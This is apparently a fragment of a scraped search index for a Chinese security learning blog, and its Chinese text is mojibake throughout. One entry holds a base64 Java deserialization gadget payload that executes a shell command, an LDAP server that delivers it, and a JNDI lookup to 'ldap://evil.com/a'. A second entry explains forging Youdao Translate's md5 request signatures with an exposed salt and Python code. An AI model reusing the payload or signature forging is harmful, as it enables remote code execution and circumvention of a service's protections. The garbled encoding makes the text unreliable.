\u0026#34;rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAAHeXV5MHVuZ3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAAAnNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyADdjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UckFYRmlsdGVyAAAAAAAAAAAAAAB4cHNyAD5vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAVTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAABi3K/rq+AAAANAA2CgAJACUKACYAJwgAKAoAJgApBwAqBwArCgAGACwHAC0HAC4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAFUxjb20veXV5MHVuZy9SQ0VUZXN0OwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAvAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAqAQAKU291cmNlRmlsZQEADFJDRVRlc3QuamF2YQwACgALBwAwDAAxADIBABJvcGVuIC1hIGNhbGN1bGF0b3IMADMANAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwACgA1AQATY29tL3l1eTB1bmcvUkNFVGVzdAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAACgAOAAAADAABAAAABQAPABAAAAABABEAEgACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAFQAOAAAAIAADAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABUAFgACABcAAAAEAAEAGAABABEAGQACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAGAAOAAAAKgAEAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABoAGwACAAAAAQAcAB0AAwAXAAAABAABABgACAAeAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAA4ACQARAAwADwANABAAFgASAA4AAAAMAAEADQAJAB8AIAAAACEAAAAHAAJMBwAiCQABACMAAAACACRwdAASSGVsbG9UZW1wbGF0ZXNJbXBscHcBAHh1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAF2cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAAAAHhwc3EAfgAAP0AAAAAAAAx3CAAAABAAAAABdAAFdmFsdWVxAH4ABnh4dAAHeXV5MXVuZ3g=\u0026#34; )); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } è¿è¡Œå®¢æˆ·ç«¯å³å¯è§¦å‘ååºåˆ—åŒ–ï¼š ",
        "summary": "JNDIæ³¨å…¥ å®æˆ˜ç»å¸¸é‡åˆ°ï¼Œåªä¼šæ‰“ä¸åŠ¨åŸç†ï¼Œç°åœ¨æ¥æµ…å­¦ä¸€ä¸‹\nJNDI JNDIï¼ˆJava Naming and Directory Interfaceï¼‰æ˜¯ Java ä¸ºç»Ÿä¸€è®¿é—®å„ç§â€œå‘½åâ€å’Œâ€œç›®å½•â€æœåŠ¡è€Œè®¾è®¡çš„ä¸€å¥—æ ‡å‡†æ¥å£ï¼ˆä½äº javax.naming.*ï¼‰\nJNDIè®¾è®¡äº†ä¸€å¥—æ ‡å‡†:\næœåŠ¡ åŠŸèƒ½ JNDI SPI åŒ… å…¸å‹ URL LDAP ç›®å½• + å‘½å com.sun.jndi.ldap.LdapCtxFactory ldap://host:389/ou=People,dc=example,dc=com DNS å‘½å com.sun.jndi.dns.DnsContextFactory dns://8.8.8.8/google.com RMI è¿œç¨‹å¯¹è±¡å‘½å com.sun.jndi.rmi.registry.RegistryContextFactory rmi://host:1099/HelloObj CORBA COS åˆ†å¸ƒå¼å¯¹è±¡ç›®å½• com.sun.jndi.cosnaming.CNCtxFactory corbaname::host:1050#MyService æ–‡ä»¶ç³»ç»Ÿ æŠŠæ–‡ä»¶è·¯å¾„å½“åå­— com.sun.jndi.fscontext.RefFSContextFactory file:/tmp/jndiref è¿™ä½¿å¾—æ‰€æœ‰çš„å‘½åå’Œç›®å½•æœåŠ¡éƒ½å¯ä»¥ä½¿ç”¨åŒä¸€å¥—ä»£ç è¿›è¡Œè°ƒç”¨ï¼›\nContext ctx = new InitialContext(); // åˆå§‹åŒ–ä¸Šä¸‹æ–‡ Object obj = ctx.lookup(\u0026#34;ldap://evil.com/a\u0026#34;); // åŒä¸€è¡Œä»£ç å¯æ¢ä»»ä½•åè®® æˆ‘ä»¬çœ‹åˆ°è¿™ä¸ªä»£ç å…¶å®å·²ç»å¯ä»¥æ€è€ƒäº†ï¼Œå¦‚æœè¿™ä¸ªlookupæ–¹æ³•å†…çš„å‚æ•°å¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨JNDIåŠ è½½ä»»æ„çš„javaæ¶æ„classæˆ–æ¶æ„ååºåˆ—åŒ–æ•°æ®\nRMI æ¥ä¸‹æ¥å­¦ä¹ å¾ˆå¸¸ç”¨çš„trickï¼Œåˆ©ç”¨RMIæœåŠ¡æ¥è¿›è¡ŒJNDIæ³¨å…¥\nRMIServer æˆ‘ä»¬å…ˆå†™ä¸€ä¸ªRMIServerï¼š\né¦–å…ˆåœ¨æœ¬æœºçš„1099ç«¯å£èµ·äº†ä¸€ä¸ªRMI Registryæ³¨å†Œè¡¨ï¼š\nLocateRegistry.createRegistry(1099); ç„¶åæ„é€ ä¸€ä¸ªæ¶æ„å¯¹è±¡ï¼Œæ­¤å¤„Referenceæ˜¯ JNDI æä¾›çš„å¯¹è±¡å¼•ç”¨å°è£…ï¼Œç”¨äºå‘Šè¯‰å®¢æˆ·ç«¯åº”è¯¥å»http://127.0.0.1:5002/ä¸‹è½½classæ–‡ä»¶ï¼Œç„¶åç”¨æŒ‡å®šå·¥å‚ç±»å®ä¾‹åŒ–\nReference reference = new Reference( \u0026#34;RMIPoc\u0026#34;, // ç±»å \u0026#34;RMIPoc\u0026#34;, // å·¥å‚ç±»åï¼ˆåŠ è½½åå®ä¾‹åŒ–ï¼‰ \u0026#34;http://127.0.0.1:5002/\u0026#34;); // è¿œç¨‹ codebaseï¼ˆjar/class ä¸‹è½½åœ°å€ï¼‰ æ¥ä¸‹æ¥æŠŠéè¿œç¨‹å¯¹è±¡ ReferenceåŒ…æˆè¿œç¨‹å¯¹è±¡å­˜æ ¹ReferenceWrapperï¼Œè®©å…¶èƒ½é€šè¿‡ RMI ä¼ è¾“ï¼š\n"
    }
,
    {
        "title": "JSé€†å‘åŸºç¡€",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/js%E5%AF%B9%E6%8A%97/js%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/",
        "content": "JSé€†å‘åŸºç¡€+æœ‰é“ç¿»è¯‘JSç®€å•åˆ†æ ç”±äºæœ€è¿‘å·¥ä½œä¸­æµ‹è¯•ç›¸å…³èµ„äº§æ—¶ï¼Œå‘ç°å¾ˆå¤šç½‘ç«™ï¼ŒåŒ…æ‹¬å°ç¨‹åºç­‰çš„webç«¯ï¼Œä¼ è¾“çš„æ•°æ®éƒ½æ˜¯ç»è¿‡äº†åŠ è§£å¯†çš„ï¼Œäºæ˜¯ä¾¿éœ€è¦æˆ‘ä»¬å¯¹jsä¸­çš„åŠ è§£å¯†éƒ¨åˆ†è¿›è¡Œåˆ†æã€è°ƒè¯•å’Œé€†å‘ï¼Œå¹¶ç¼–å†™hookä»£ç ï¼Œé…åˆä¸€äº›å·¥å…·å°†æˆ‘ä»¬æµ‹è¯•çš„è¯·æ±‚è‡ªåŠ¨åŠ å¯†ï¼Œå°†å“åº”è‡ªåŠ¨è§£å¯†ï¼ˆå…¶å®å’Œçˆ¬è™«éå¸¸ç±»ä¼¼ï¼‰ï¼Œå®ç°å¯¹æ•°æ®åŠ è§£å¯†çš„å¯¹æŠ—\nå‰ç½®çŸ¥è¯† JSç›¸å…³ ä½ å¯èƒ½éœ€è¦å…ˆæŒæ¡ï¼šjavascriptåŸºç¡€ã€é—­åŒ…ã€é¢å‘å¯¹è±¡ã€åŸå‹ã€åŸå‹é“¾\nå¯¹è¿™äº›æ¦‚å¿µæŒæ¡ä¸”èƒ½çœ‹æ‡‚jsä»£ç å³å¯\næ•°æ®ä¼ è¾“ç›¸å…³ åŠ è§£å¯†ã€ç¼–è§£ç ã€æ¶ˆæ¯æ‘˜è¦ï¼Œè¿™äº›å…¶å®å°±æ˜¯åº”ç”¨å¯†ç å­¦ç›¸å…³çŸ¥è¯†ï¼Œäº†è§£åŸç†å’Œä½œç”¨\nåŸºç¡€åè°ƒè¯• è¿™é‡Œè¯´çš„æ˜¯æœ€ç®€å•çš„ä¸€ç±»æƒ…å†µï¼Œå¸¸ä½“ç°ä¸ºç¦ç”¨F12ã€ç¦ç”¨å³é”®ç­‰ï¼Œéƒ½æ˜¯CTFå…¥é—¨æ¥è§¦çš„ï¼Œç›´æ¥åœ¨æµè§ˆå™¨é€‰é¡¹ä¸­è°ƒå‡ºå¼€å‘è€…å·¥å…·å³å¯\nç”±äºè°ƒå‡ºå¼€å‘è€…å·¥å…·åä¼šå æ®ä¸€éƒ¨åˆ†å±å¹•å¯¼è‡´innerWidthæˆ–innerHeightçš„å€¼å˜å°ï¼Œè¿™ä¸€å±æ€§ä¹Ÿæœ‰å¯èƒ½ç”¨äºåè°ƒè¯•ï¼Œè§£å†³æ–¹æ¡ˆå°±æ˜¯è®©å¼€å‘è€…å·¥å…·ä»¥å•ç‹¬çª—å£æ‰“å¼€è€Œä¸æ˜¯åœé åœ¨æµè§ˆå™¨é¡µé¢ä¸Š\nä¸€äº›å¼€å‘è€…å·¥å…·çš„åŠŸèƒ½ å¾ˆå¤šæ“ä½œåœ¨å¹²æ¸—é€çš„æ—¶å€™éƒ½ä¼šäº†ï¼Œå°±ä¸å¤šèµ˜è¿°ï¼Œè¿™é‡Œè®°å½•ä¸€ç‚¹ä»¥å‰æ²¡ç”¨è¿‡çš„ï¼š\nä¿ç•™æ—¥å¿—/æŒç»­è®°å½•ï¼ˆä¸€èˆ¬å¼€å¯ï¼‰ ç¦ç”¨ç¼“å­˜ï¼ˆä¸€èˆ¬å¼€å¯ï¼‰ å†…å®¹æ ¼å¼åŒ–ï¼ˆå€¼å¾—æ³¨æ„çš„æ˜¯æœç´¢æ–‡ä»¶å†…å®¹æœ€å¥½æœç´¢æ ¼å¼åŒ–ä¹‹å‰çš„ï¼Œæ ¼å¼åŒ–å¯èƒ½ä¼šè¡¥å……ç©ºæ ¼ä¹‹ç±»çš„å¯¼è‡´æœç´¢ä¸åˆ°ï¼‰ Fetch/XHRï¼šjsä»£ç ä¸­å‘é€çš„ç½‘ç»œè¯·æ±‚ï¼Œæ¯”å¦‚fetch/ajax æ–‡æ¡£/HTMLï¼šé¡µé¢åŠ è½½çš„ç¬¬ä¸€ä¸ªhtml ç½‘ç»œï¼šå¯ä»¥çœ‹åˆ°è¯·æ±‚ä¸å“åº”ï¼ˆå€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨è¿™é‡Œæ— æ³•é€šè¿‡ctrl+fè¿›è¡Œæœç´¢è¯·æ±‚ä½“å†…å®¹ï¼‰ è°ƒç”¨å †æ ˆï¼šè°ƒè¯•ç•Œé¢çš„åŠŸèƒ½ï¼Œå½“å‡½æ•°è¿è¡Œèµ·æ¥æ—¶ï¼Œè°ƒç”¨å †æ ˆå¯ä»¥æè¿°å½“å‰è¿è¡Œåˆ°çš„æ–­ç‚¹å¤„çš„ä»£ç  æ§åˆ¶å°è¾“å‡ºï¼šåˆ†ä¸ºé”™è¯¯ã€å‘Šè­¦ã€ä¿¡æ¯ã€æ—¥å¿—ã€è°ƒè¯•ç­‰å‡ ç§è¾“å‡ºçº§åˆ« åŸºç¡€æ­¥éª¤ è¿™é‡Œä»¥æœ‰é“ç¿»è¯‘çš„æ–‡æœ¬ç¿»è¯‘åŠŸèƒ½ä¸ºä¾‹æ¥å°†åŸºç¡€è¿‡ä¸€éï¼Œè¿™é‡Œå…ˆç”¨å†™çˆ¬è™«ä¸€æ ·çš„é€»è¾‘æ¥èµ°ä¸€éï¼Œåé¢å†å†™å…³äºæ¸—é€æµ‹è¯•ç¯å¢ƒä¸­çš„ç®€å•åˆ†æ\nåŠ å¯†é€»è¾‘åˆ†æ é¦–å…ˆæ˜¯åŠ å¯†ï¼Œå³æˆ‘ä»¬å‘é€è¯·æ±‚æ—¶æŠ“åŒ…ï¼Œå‘ç°åŒ…ä¸­çš„ä¸€äº›æ•°æ®ä¸æ˜¯æ˜æ–‡ï¼Œæˆ–è€…ç›¸æ¯”æäº¤çš„æ•°æ®å¤šäº†ä¸€äº›åƒç­¾åä¹‹ç±»çš„å‚æ•°ï¼Œå°±éœ€è¦åˆ†æå‰ç«¯åŠ å¯†é€»è¾‘\nå®šä½æ•°æ®æ¥æº é¦–å…ˆéœ€è¦åšçš„äº‹å°±æ˜¯å®šä½æˆ‘ä»¬æ•°æ®äº¤äº’æ—¶åŠ è§£å¯†æ•°æ®çš„è¯·æ±‚åŒ…ï¼Œå¯¹äºå­¦ä¹ äº†ç½‘å®‰çš„äººï¼Œç›¸ä¿¡ä¸è®ºæ˜¯f12è¿˜æ˜¯burpéƒ½æ˜¯æä¸ºç®€å•çš„ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆè½»æ¾å®šä½åˆ°æŒ‡å®šæ–‡æœ¬ç¿»è¯‘åŠŸèƒ½çš„åŒ…ï¼š è¯†åˆ«åŠ å¯†å‚æ•° è¿™é‡Œæˆ‘ä»¬å…ˆå°†å®šä½åˆ°çš„è¯·æ±‚åŒ…å¤åˆ¶ä¸ºcurlå‘½ä»¤ï¼š\nå¹¶è½¬æ¢ä¸ºpython requestï¼š\nåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥è¿è¡Œè„šæœ¬å¹¶è·å¾—åŠ å¯†åçš„ç»“æœï¼š\næˆ‘ä»¬åˆ†æè¯·æ±‚å‚æ•°:\ndata = { \u0026#34;i\u0026#34;: \u0026#34;ä½ å¥½\u0026#34;, \u0026#34;from\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;to\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;useTerm\u0026#34;: \u0026#34;false\u0026#34;, \u0026#34;dictResult\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;keyid\u0026#34;: \u0026#34;webfanyi\u0026#34;, \u0026#34;sign\u0026#34;: \u0026#34;68732687ef98f424db7c2c20c30ddb9d\u0026#34;, \u0026#34;client\u0026#34;: \u0026#34;fanyideskweb\u0026#34;, \u0026#34;product\u0026#34;: \u0026#34;webfanyi\u0026#34;, \u0026#34;appVersion\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;vendor\u0026#34;: \u0026#34;web\u0026#34;, \u0026#34;pointParam\u0026#34;: \u0026#34;client,mysticTime,product\u0026#34;, \u0026#34;mysticTime\u0026#34;: \u0026#34;1747409777255\u0026#34;, \u0026#34;keyfrom\u0026#34;: \u0026#34;fanyi.web\u0026#34;, \u0026#34;mid\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;screen\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;model\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;network\u0026#34;: \u0026#34;wifi\u0026#34;, \u0026#34;abtest\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;yduuid\u0026#34;: \u0026#34;abcdefg\u0026#34; } å…¶å®ä¸éš¾çœ‹å‡ºæ¥ä¸€äº›å…³é”®ä¿¡æ¯ï¼š\niå°±æ˜¯æˆ‘ä»¬è¯·æ±‚çš„æ–‡æœ¬å†…å®¹æ˜æ–‡ signåœ¨è¿™é‡Œåº”è¯¥æ˜¯md5è¿™ç§è¯·æ±‚æ‘˜è¦ç­¾åï¼Œé€šè¿‡æ›´æ”¹å…¶ä»–çš„å‚æ•°ï¼ŒæŸ¥çœ‹åŠ å¯†çš„å“åº”å¯ä»¥çŸ¥é“ï¼Œå‚æ•° i æ²¡æœ‰å‚ä¸æ‘˜è¦ç®—æ³•ï¼Œä½†æ—¶é—´æˆ³mysticTimeå‚ä¸äº†ï¼ˆç­¾åä¸€èˆ¬éƒ½æ˜¯æœ¬åœ°jsç”Ÿæˆï¼‰ å®šä½åˆ†æåŠ å¯†ç®—æ³• å…¥æ‰‹ç‚¹è‚¯å®šæ˜¯signçš„ç­¾åç®—æ³•ï¼Œé€šè¿‡å…¨å±€æœç´¢å¯»æ‰¾ä¸€ä¸‹ï¼ˆå¯ä»¥è¿‡æ»¤æ‰æ— ç”¨çš„æ–‡ä»¶ç±»å‹æ¯”å¦‚cssï¼‰ï¼Œåƒä¸‹é¢è¿™æ ·æœç´¢å…³é”®å­—ï¼š\nsign sign=ï¼ˆæ³¨æ„è¿™é‡Œä¸è¦åŠ ç­‰å·ï¼‰ sign: \\bsignï¼ˆéœ€è¦å¯ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼Œ\\bä»£è¡¨åŒ¹é…å­—ç¬¦è¾¹ç•Œï¼‰ å¯ä»¥å‘ç°å¾ˆå¤šç–‘ä¼¼çš„ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥éƒ½æ‰“ä¸Šæ–­ç‚¹è¿›è¡ŒéªŒè¯ï¼Œæ¯”å¦‚ï¼š\næ‰“ä¸Šæ–­ç‚¹åœ¨é‡æ–°è§¦å‘ç¿»è¯‘åŠŸèƒ½å‘é€è¯·æ±‚ï¼š å‘ç°å¹¶æ²¡æœ‰è¿è¡Œè‡³æ–­ç‚¹ï¼Œè¯´æ˜å®šä½ä¸å¯¹ï¼Œæ¢ä¸ªæœç´¢ç»§ç»­ç›´è‡³æ‰¾åˆ°signçš„ä½ç½®ï¼Œå‘ç°åªæœ‰app.1695dab9.jsä¸­çš„signä¸¤æ¬¡è§¦å‘æ–­ç‚¹ï¼š å¯ä»¥åˆæ­¥åˆ¤æ–­è¿™é‡Œå°±æ˜¯æˆ‘ä»¬ç›®æ ‡çš„signå°±æ˜¯è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥éªŒè¯ä¸€ä¸‹ï¼Œé¦–å…ˆæ¸…ç©ºç½‘ç»œè¯·æ±‚ï¼Œå†æ¬¡è§¦å‘ç¿»è¯‘è‡³æ–­ç‚¹ï¼Œç„¶åé€‰ä¸­è¿™ä¸ªsignçš„å†…å®¹ï¼Œå³é”®åœ¨æ§åˆ¶å°æ±‚å€¼ï¼š å¯ä»¥çœ‹åˆ°æ±‚å€¼æ˜¯å›ºå®šçš„ï¼Œè¿™é‡Œå¦‚æœæœ‰ç»éªŒçš„è¯å¯ä»¥åˆæ­¥åˆ¤æ–­æ˜¯ç±»ä¼¼md5çš„ç®—æ³•äº†ï¼š å¯ä»¥åˆ†æä¸€ä¸‹è¿™é‡ŒSå‡½æ•°çš„ä¸¤ä¸ªå‚æ•°ï¼š aå¾ˆæ˜æ˜¾æ˜¯ä¸€ä¸ªæ—¶é—´æˆ³ï¼Œè€Œeç–‘ä¼¼æ˜¯saltè¿™ç§ä¸œè¥¿\næˆ‘ä»¬è¿˜å¯ä»¥å‘ç°ï¼Œæ¯æ¬¡è¯·æ±‚ï¼Œä¸¤æ¬¡è§¦å‘æ–­ç‚¹æ—¶çš„signå€¼éƒ½æ˜¯ä¸ä¸€æ ·çš„ï¼š åˆ†æç½‘ç»œè¯·æ±‚ï¼Œå¯çŸ¥ç¬¬äºŒæ¬¡æ–­ç‚¹çš„signå€¼å°±æ˜¯æˆ‘ä»¬çš„ç¿»è¯‘è¯·æ±‚åŒ…çš„å€¼ï¼š\nç¬¬ä¸€æ¬¡æ–­ç‚¹çš„è¯·æ±‚ï¼š\nç¬¬äºŒæ¬¡æ–­ç‚¹çš„è¯·æ±‚ï¼š æ¥ä¸‹æ¥å®šä½åˆ°Så‡½æ•°å†…éƒ¨è¿›è¡Œåˆ†æï¼Œå¯ä»¥ä»é€‰ä¸­å‡½æ•°jump to definitionï¼š ä¹Ÿå¯ä»¥é€‰æ‹©ä»æ–­ç‚¹å¤„æ­¥è¿›ï¼š\nè¿™æ ·æˆ‘ä»¬å¯ä»¥å‘ç°Så‡½æ•°çš„å®šä¹‰å°±åœ¨è¯·æ±‚ä»£ç ä¸Šé¢ï¼š å¯ä»¥çœ‹åˆ°mysticTimeå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„æ—¶é—´æˆ³ï¼Œkeyå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„saltï¼Œå†åˆ†æä¸€ä¸‹å‡½æ•°å†…æ¨¡æ¿å­—é¢é‡çš„å…¶ä»–ä¸¤ä¸ªå€¼då’Œuï¼š\nå¯ä»¥çœ‹åˆ°clientå’Œproductçš„å€¼å…¶å®æ˜¯æ±‰è¯­æ‹¼éŸ³ï¼ŒéªŒè¯åå¯ä»¥çŸ¥é“è¿™ä¸¤ä¸ªå‚æ•°æ˜¯å›ºå®šçš„\næˆ‘ä»¬ä¸Šé¢æåˆ°äº†Så‡½æ•°è¿”å›çš„signæ ¼å¼ç–‘ä¼¼md5ï¼Œäºæ˜¯å°†è¿™é‡Œå‡½æ•°å†…çš„è¿™ä¸²å‚æ•°æ‹¿å»è¯•ä¸€ä¸‹ï¼š\nclient=fanyideskweb\u0026amp;mysticTime=1747584582990\u0026amp;product=webfanyi\u0026amp;key=Vy4EQ1uwPkUoqvcP1nIu6WiAjxFeA3Y3 md5åï¼š æˆ‘ä»¬å¾—åˆ°äº†md5å­—ç¬¦ä¸²f7809939d67c6626ff2c0552ec6f04d9ï¼Œè¿™å’Œç¬¬äºŒæ¬¡æ–­ç‚¹çš„signä¸€è‡´ï¼š\nè¡¨æ˜ç¡®å®æ˜¯ä½¿ç”¨æ ‡å‡†md5æ— é­”æ”¹ï¼Œå¹¶ä¸”æˆ‘ä»¬åˆ†æSå‡½æ•°æ—¶å¯ä»¥çœ‹è§å†…éƒ¨è°ƒç”¨çš„æ˜¯_å‡½æ•°ï¼Œå®šä½åå¯ä»¥ç¡®è®¤çš„ç¡®æ˜¯md5åŠ å¯†ç®—æ³•ï¼š è¿™ä¸€éƒ¨åˆ†åŠ å¯†ç”¨pythonå®ç°ï¼š\ndef get_sign(time,key): md5_obj = md5() md5_obj.update(f\u0026#39;client=fanyideskweb\u0026amp;mysticTime={time}\u0026amp;product=webfanyi\u0026amp;key={key}\u0026#39;.encode()) sign = md5_obj.hexdigest() return sign ç»è¿‡åˆ†ææˆ‘ä»¬å·²ç»åŸºæœ¬ææ‡‚åŠ å¯†éƒ¨åˆ†äº†ï¼Œä½†æ˜¯ç»†å¿ƒä¸€ç‚¹å°±ä¼šå‘ç°æˆ‘ä»¬çš„keyä¹Ÿå°±æ˜¯ç›å€¼ï¼Œæ¯æ¬¡è¯·æ±‚ä¼šå˜ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥çš„é—®é¢˜å°±æ˜¯åˆ†æå®ƒçš„åŠ¨æ€ç›å€¼é€»è¾‘äº†\nåŠ¨æ€ç›å€¼è§£å†³ å› ä¸ºsaltæ˜¯åŠ¨æ€çš„ï¼Œå¹¶ä¸”éœ€è¦clientå’ŒserveråŒæ­¥ï¼Œæ‰€ä»¥å¾ˆå¤§å¯èƒ½æ˜¯clientå‘serverè¯·æ±‚çš„ï¼Œåœ¨ç½‘ç»œè¯·æ±‚ä¸­æœç´¢saltå€¼å®šä½ä¸€ä¸‹ï¼š å‘ç°æ˜¯åœ¨jsä¸­è¿›è¡Œè·å–çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬è·å–çš„æ–¹æ³•å¾ˆæ˜æ˜¾äº†ï¼Œç›´æ¥è¯·æ±‚è¿™ä¸ªjsç„¶åæ­£åˆ™åŒ¹é…è·å–saltï¼Œå’Œä¸Šé¢åŒæ ·çš„æ–¹æ³•ï¼Œè½¬åŒ–ä¸ºpythonï¼Œä½†æ˜¯è¯·æ±‚ä¸­ä¾ç„¶æœ‰signï¼š åˆ†æä¸€ä¸‹å°±çŸ¥é“è¿™ä¸ªè‚¯å®šæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨Så‡½æ•°æ—¶è·å–çš„ï¼Œé‚£ä¹ˆæƒ³è¦è§£å†³ç¬¬äºŒæ¬¡çš„saltï¼Œå°±è¦å…ˆè·å–ç¬¬ä¸€æ¬¡çš„saltï¼Œè°ƒè¯•å®šä½ä¸€ä¸‹ï¼Œå‘ç°ç¬¬ä¸€æ¬¡çš„saltæ˜¯åœ¨app.jsä¸­åŠ è½½çš„ï¼š\né‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå¯ä»¥è¯·æ±‚ç„¶åæ­£åˆ™ï¼š\ndef get_salt1(): url = \u0026#34;https://shared.ydstatic.com/dict/translation-website/0.6.1/js/app.1695dab9.js\u0026#34; response = requests.get(url, headers=HEADERS) return 